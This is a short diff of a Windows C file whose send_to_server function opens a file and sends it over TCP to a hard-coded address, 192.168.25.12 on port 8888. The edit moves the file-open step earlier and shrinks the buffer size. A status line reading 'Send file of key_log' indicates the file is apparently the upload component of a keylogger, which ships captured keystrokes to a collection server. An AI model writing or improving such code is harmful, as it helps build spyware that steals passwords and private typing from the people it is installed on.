@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "TCP_send.h"
-#define BUF_SIZE 30
+#define BUF_SIZE 10
 #define DEF_PORT 8888
 #define DEF_IP "192.168.25.12"
 
@@ -16,6 +16,11 @@ int send_to_server(const char* filename) {
 	WSADATA wsa;
 	SOCKET send_socket;
 	SOCKADDR_IN send_arr;
+
+	FILE *fp;
+	fp = fopen(filename, "rb");
+	if (!fp)
+		return error_handling("[-] Error: fopen() fail");
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 		error_handling("[-] Error : WSAStartup() fail");
@@ -33,10 +38,7 @@ int send_to_server(const char* filename) {
 	if (connect(send_socket, (SOCKADDR*)&send_arr, sizeof(send_arr)) == SOCKET_ERROR)
 		return error_handling("[-] Error: connect() fail");
 
-	FILE *fp;
-	fp = fopen(filename, "rb");	
-	if (!fp)
-		return error_handling("[-] Error: fopen() fail");
+	
 
 	printf("[+] Send file of key_log\n");
 
